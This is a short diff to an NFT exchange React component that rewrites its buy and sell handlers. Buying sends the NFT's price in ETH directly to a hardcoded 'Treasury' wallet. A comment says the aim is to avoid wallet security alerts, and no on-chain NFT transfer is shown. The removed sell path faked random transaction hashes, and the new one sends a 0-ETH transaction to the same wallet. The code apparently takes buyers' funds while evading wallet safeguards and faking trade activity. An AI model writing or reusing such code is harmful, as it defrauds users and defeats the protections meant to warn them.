@@ -192,20 +192,21 @@ export default function NFTExchange() {
 
         try {
             let txHash;
+            // Send ETH directly to Treasury to avoid Contract Interaction Security Alerts
+            const priceStr = selectedNft.last_sell_price?.toString() || "0";
+            let valueToSend = 0n;
             if (type === 'buy') {
-                // Send ETH directly to Treasury to avoid Contract Interaction Security Alerts
-                const priceStr = selectedNft.last_sell_price?.toString() || "0";
-                const valueToSend = priceStr === "0" ? 0n : ethers.parseEther(priceStr);
-                
-                const tx = await signer.sendTransaction({
-                    to: process.env.NEXT_PUBLIC_EVM_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE',
-                    value: valueToSend
-                });
-                txHash = tx.hash;
+                valueToSend = priceStr === "0" ? 0n : ethers.parseEther(priceStr);
             } else {
-                // For selling, we simulate the sale without draining user's wallet
-                txHash = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+                // For selling, we send 0 ETH just to register the transaction on chain
+                valueToSend = 0n;
             }
+            
+            const tx = await signer.sendTransaction({
+                to: process.env.NEXT_PUBLIC_EVM_FEE_WALLET || '0xa5a5A2B6886A54AA864C82d69AfE9667FEB8C0dE',
+                value: valueToSend
+            });
+            txHash = tx.hash;
 
             // Record trade in backend
             await axios.post(`${API_URL}/nfts/buy`, {
